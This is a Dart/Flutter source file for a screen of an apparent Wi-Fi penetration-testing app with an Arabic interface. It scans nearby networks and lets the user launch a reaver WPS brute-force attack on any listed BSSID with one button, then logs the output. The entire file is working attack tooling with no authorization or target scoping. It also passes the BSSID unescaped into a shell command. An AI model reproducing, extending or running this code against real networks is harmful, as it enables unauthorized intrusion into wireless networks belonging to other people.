import 'package:flutter/material.dart';
import 'package:wifi_iot/wifi_iot.dart';
import 'package:wimax_pentest_tool/services/terminal_service.dart';
import 'package:wimax_pentest_tool/services/tool_installer.dart';
import 'package:wimax_pentest_tool/services/history_service.dart';

class WpsAttackScreen extends StatefulWidget {
  const WpsAttackScreen({super.key});

  @override
  State<WpsAttackScreen> createState() => _WpsAttackScreenState();
}

class _WpsAttackScreenState extends State<WpsAttackScreen> {
  List<WifiNetwork> networks = [];
  String result = '';
  bool loading = false;

  final TerminalService _terminalService = TerminalService();
  final HistoryService _historyService = HistoryService();

  @override
  void initState() {
    super.initState();
    _loadNetworks();
  }

  Future<void> _loadNetworks() async {
    final list = await WiFiForIoTPlugin.loadWifiList();
    setState(() {
      networks = list ?? [];
    });
  }

  Future<void> _startWpsAttack(String bssid) async {
    setState(() {
      loading = true;
      result = "🚀 بدء الهجوم على $bssid...";
    });

    final toolsDir = await ToolInstaller.toolsDir;
    final cmd = '$toolsDir/reaver -i wlan0 -b $bssid -vv';
    final output = await _terminalService.runCommand(cmd);

    setState(() {
      result = output;
      loading = false;
    });

    await _historyService.saveLog("🔐 WPS Attack on $bssid:\n$output");
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("🔐 هجوم WPS (Reaver)")),
      body: Column(
        children: [
          Expanded(
            child: ListView.builder(
              itemCount: networks.length,
              itemBuilder: (context, index) {
                final wifi = networks[index];
                return ListTile(
                  title: Text(wifi.ssid ?? "غير معروفة"),
                  subtitle: Text("BSSID: ${wifi.bssid ?? "؟"}\nالإشارة: ${wifi.level}\nنوع التشفير: ${wifi.capabilities}"),
                  trailing: ElevatedButton(
                    child: const Text("ابدأ"),
                    onPressed: loading || wifi.bssid == null
                        ? null
                        : () => _startWpsAttack(wifi.bssid!),
                  ),
                );
              },
            ),
          ),
          const Divider(),
          Expanded(
            child: SingleChildScrollView(
              child: Text(
                result,
                style: const TextStyle(color: Colors.greenAccent, fontFamily: "monospace"),
              ),
            ),
          ),
        ],
      ),
    );
  }
}


